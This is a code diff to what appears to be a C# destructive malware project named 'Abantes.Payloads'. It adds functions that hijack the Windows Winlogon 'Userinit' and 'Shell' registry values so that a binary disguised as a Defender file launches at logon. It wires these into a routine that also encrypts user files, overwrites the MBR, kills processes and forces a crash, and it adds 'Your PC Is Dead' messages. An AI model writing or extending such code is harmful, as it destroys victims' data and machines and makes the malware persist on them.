@@ -120,6 +120,20 @@ namespace Abantes.Payloads
             ScriptProcess.StartInfo.FileName = extractPath + @"\logonOverwrite.bat"; 
             ScriptProcess.Start();
         }
+        public static void UserInitOverwrite()
+        {
+            RegistryKey editKey;
+            editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\WinLogon");
+            editKey.SetValue("Userinit", @"C:\Windows\Defender\LogonUIStart.exe,");
+            editKey.Close();
+        }
+        public static void ExplorerOverwrite()
+        {
+            RegistryKey editKey;
+            editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\WinLogon");
+            editKey.SetValue("Shell", @"C:\Windows\Defender\LogonUIStart.exe");
+            editKey.Close();
+        }
         public static void EncryptUserFiles()
         {
             List<string> pathsToEncrypt = new List<string>();
@@ -203,6 +217,8 @@ namespace Abantes.Payloads
             {
                 EncryptUserFiles();
                 LogonUIOverwrite();
+                ExplorerOverwrite();
+                UserInitOverwrite();
                 MBR_Overwrite();
                 KillAll();
                 FORCE_BSOD();
@@ -220,6 +236,7 @@ namespace Abantes.Payloads
                 if (File.Exists(file) == false)
                 {
                     Destructive.KillPC();
+                    MessageBox.Show("Your PC Is Dead");
                 }
             }
         }
@@ -233,6 +250,7 @@ namespace Abantes.Payloads
                 if (proc.Length > 0)
                 {
                     Destructive.KillPC();
+                    MessageBox.Show("Your PC Is Dead");
                 }
             }
 
@@ -243,6 +261,7 @@ namespace Abantes.Payloads
                 {
                     //Not Running
                     Destructive.KillPC();
+                    MessageBox.Show("Your PC Is Dead");
                 }
                 else
                 {
